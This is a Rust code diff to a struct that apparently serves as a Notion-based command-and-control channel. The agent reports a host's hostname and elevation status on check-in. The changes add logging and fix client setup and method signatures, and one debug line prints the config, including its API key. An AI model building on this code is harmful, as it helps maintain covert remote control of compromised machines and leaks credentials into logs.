@@ -28,7 +28,7 @@ pub struct NotionConfig {
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct NotionChannel {
     pub config: NotionConfig,
-    #[serde(skip_serializing)]
+    #[serde(skip_serializing, skip_deserializing)]
     pub logger: Logger,
     #[serde(skip_serializing, skip_deserializing)]
     pub client: Client
@@ -59,9 +59,9 @@ impl NotionChannel {
     /// all the way down. When the full config file is loaded from wherever it's loaded,
     /// this struct will already exist and not need to be parsed here.
     /// 
-    async fn new(config: NotionConfig, is_admin: bool) -> Result<NotionChannel, ChannelError> {
+    async fn new(config: NotionConfig, is_admin: bool, log_level: u64) -> Result<NotionChannel, ChannelError> {
 
-        let logger = Logger::new(LOG_DEBUG);
+        let logger = Logger::new(log_level);
         
         let client = NotionChannel::client(&config.api_key)?;
         Ok(NotionChannel {config, logger, client})
@@ -93,8 +93,10 @@ impl NotionChannel {
     /// Retrieves blocks from Notion. All children blocks of the parent page returned
     /// TODO: Account for pagination for > 100 children.
     pub async fn get_blocks(&self) -> Result<serde_json::Value, String> {
+        self.logger.info(log_out!(URL_BASE));
         let page_id = &self.config.page_id;
         let url = format!("{URL_BASE}/blocks/{page_id}/children");
+        self.logger.debug(log_out!(url));
 
         let r = self.client.get(url).send().await.unwrap();
 
@@ -124,13 +126,14 @@ impl Channel for NotionChannel {
     async fn init(&mut self) -> Result<String, ChannelError> {
         self.logger.info(format!("Creating page..."));
 
-        // Initialize the client to send
-        let client = NotionChannel::client(&self.config.api_key);
-
         // Get hostname
         let mut hn = hostname();
 
         let is_admin = is_elevated();  
+
+        // Set client correctly
+        let client = NotionChannel::client(&self.config.api_key)?;
+        self.client = client;
 
         self.logger.info(log_out!("Hostname: ", &hn));
         self.logger.debug(format!("Config options: {:?}", self.config));
@@ -147,8 +150,6 @@ impl Channel for NotionChannel {
 
         let url = format!("{}/pages/", URL_BASE);
         
-        let mut check_in_emoji: String = "".to_string();
-
         let is_admin = is_elevated();
 
         let check_in_emoji = match is_admin {
@@ -178,6 +179,9 @@ impl Channel for NotionChannel {
                 }]
             }
         });
+
+        self.logger.debug(log_out!("Create Page URL: ", &url));
+
         let r = self.client
             .post(url)
             .json(&body)
@@ -313,11 +317,11 @@ impl Channel for NotionChannel {
     ///
     /// This is useful for sending ConfigOptions to launch commands
     /// 
-    fn to_base64(self) -> String {
+    fn to_base64(&self) -> String {
         encode(to_string(&self.config).unwrap().as_bytes())
     }
 
-    fn update(self, options: String) -> Result<String, ChannelError> {
+    fn update(&self, options: String) -> Result<String, ChannelError> {
 
         command_out!("Config updated")
     }
